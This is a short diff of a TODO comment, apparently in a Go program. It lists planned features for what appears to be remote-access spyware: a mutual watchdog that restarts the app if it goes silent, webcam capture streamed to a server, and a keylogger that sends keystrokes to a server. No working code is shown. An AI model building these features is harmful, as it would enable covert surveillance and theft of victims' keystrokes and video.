@@ -6,10 +6,8 @@ TODO:
 	1 -implement a checker that checks if app has gone silent and make app check if checker is silent
 		if either are silent then start it
 	2 -Play Audio file sent by server
-	3 - display images sent by server
-	4 - display videos sent by server
-	5 - Access Webcam and stream to server
-	6 - keylogger and send data to server
+	3 - Access Webcam and stream to server
+	4 - keylogger and send data to server
 */
 
 import (
